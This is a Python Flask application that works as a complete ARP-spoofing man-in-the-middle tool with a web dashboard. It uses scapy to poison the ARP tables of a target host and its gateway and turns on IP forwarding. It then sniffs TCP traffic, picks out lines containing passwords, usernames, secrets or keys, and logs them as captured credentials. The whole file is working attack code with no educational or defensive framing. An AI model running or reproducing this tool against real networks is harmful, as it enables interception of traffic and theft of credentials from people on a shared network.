from flask import Flask, render_template, jsonify, request
import threading
import time
import scapy.all as scapy
import sys
import os
import signal
import re 

app = Flask(__name__)

# --- GLOBAL STATE (Thread Safe) ---
STOP_EVENT = threading.Event()
ATTACK_THREAD = None
SNIFFER_THREAD = None

# Default Configuration and State Tracking
STATUS = {
    "state": "IDLE",
    "target": "192.168.1.20",
    "gateway": "192.168.1.1",
    "interface": "eth0",
    "packets": 0,
    "target_mac": "N/A",
    "logs": ["[SYSTEM] Initialized. Ready."],
    "intercepted_data": [] 
}

# --- UTILITY FUNCTIONS ---

def log_msg(message):
    """Adds a timestamped message to the global log buffer."""
    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    if len(STATUS["logs"]) > 50:
        STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    print(full_msg)

def set_ip_forwarding(value):
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except Exception as e:
        log_msg(f"FATAL: Failed to set IP forwarding: {e}")
        sys.exit(1)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=STATUS["interface"])[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=STATUS["interface"])

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        log_msg("WARNING: Could not resolve MACs for clean exit.")
        return
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])

# --- SNIFFING LOGIC ---

def packet_callback(packet):
    if STOP_EVENT.is_set(): return 

    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            keywords = ["pass=", "password", "user=", "username", "login", "secret", "CONFIDENTIAL", "key="]
            is_sensitive = False
            captured_secret = ""

            for line in payload.split('\n'):
                if any(key.lower() in line.lower() for key in keywords):
                    is_sensitive = True
                    captured_secret = line.strip()
                    break 
            
            # Filter for HTTP traffic or Secrets
            if is_sensitive or "HTTP" in payload:
                if packet.haslayer(scapy.IP):
                    src = packet[scapy.IP].src
                    dst = packet[scapy.IP].dst
                else:
                    src = "Unknown"
                    dst = "Unknown"

                if is_sensitive:
                    snippet = f"[SECRET] {captured_secret[:60]}" 
                    log_type = "ALERT" 
                else:
                    snippet = payload.split('\r\n')[0][:60]
                    log_type = "INFO"

                STATUS["intercepted_data"].append({
                    "time": time.strftime('%H:%M:%S'),
                    "src": src,
                    "dst": dst,
                    "snippet": snippet,
                    "type": log_type
                })
                
                if is_sensitive:
                    log_msg(f"[ALERT] CAPTURED CREDENTIALS from {src}!")

        except Exception as e:
            pass 

# --- ATTACK THREAD LOGIC ---

def run_attack_loop(target_ip, gateway_ip):
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    log_msg(f"[+] Attack launched against {target_ip}")
    set_ip_forwarding(1)
    
    os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 > /dev/null")
    
    try:
        while not STOP_EVENT.is_set():
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)
            
            if target_mac and gateway_mac:
                if STATUS["target_mac"] == "N/A":
                    STATUS["target_mac"] = target_mac
                    log_msg(f"[+] RESOLVED: Target={target_mac} | Gateway={gateway_mac}")
                
                spoof(target_ip, gateway_ip, target_mac) 
                spoof(gateway_ip, target_ip, gateway_mac) 
                
                STATUS["packets"] += 2
                # Packet sent logs removed to reduce spam
            else:
                log_msg(f"[!] WARNING: Target unreachable. Retrying...")
                
            time.sleep(2)

    except Exception as e:
        log_msg(f"[!] CRITICAL ERROR: {e}")
    
    finally:
        log_msg("[-] Stopping thread... Restoring ARP tables.")
        restore(target_ip, gateway_ip)
        set_ip_forwarding(0)
        STATUS["state"] = "IDLE"
        STATUS["target_mac"] = "N/A"
        STOP_EVENT.clear() 

# --- FLASK ROUTES ---

@app.route('/')
def index():
    if scapy.conf.iface is None: STATUS["interface"] = 'eth0'
    return render_template('index.html', data=STATUS)

@app.route('/update')
def update():
    return jsonify(STATUS)

@app.route('/action', methods=['POST'])
def action():
    global ATTACK_THREAD, SNIFFER_THREAD
    req = request.json
    action_type = req.get('action')
    
    if action_type == 'start':
        if STATUS["state"] == "RUNNING":
            return jsonify({"status": "error", "message": "Attack already running!"})
        
        STATUS["target"] = req.get('target')
        STATUS["gateway"] = req.get('gateway')
        STATUS["interface"] = req.get('interface')
        scapy.conf.iface = STATUS["interface"]
        
        SNIFFER_THREAD = threading.Thread(target=scapy.sniff, kwargs={
            'iface': STATUS["interface"], 
            'store': 0, 
            'prn': packet_callback
        })
        SNIFFER_THREAD.daemon = True
        SNIFFER_THREAD.start()

        STOP_EVENT.clear()
        ATTACK_THREAD = threading.Thread(target=run_attack_loop, args=(STATUS["target"], STATUS["gateway"]))
        ATTACK_THREAD.daemon = True
        ATTACK_THREAD.start()
        return jsonify({"status": "success", "message": "Attack launched"})
    
    elif action_type == 'stop':
        STOP_EVENT.set()
        return jsonify({"status": "success", "message": "Stopping..."})
    
    return jsonify({"status": "error", "message": "Invalid action."})

if __name__ == '__main__':
    scapy.conf.iface = STATUS["interface"]
    app.run(host='0.0.0.0', port=5000, debug=False)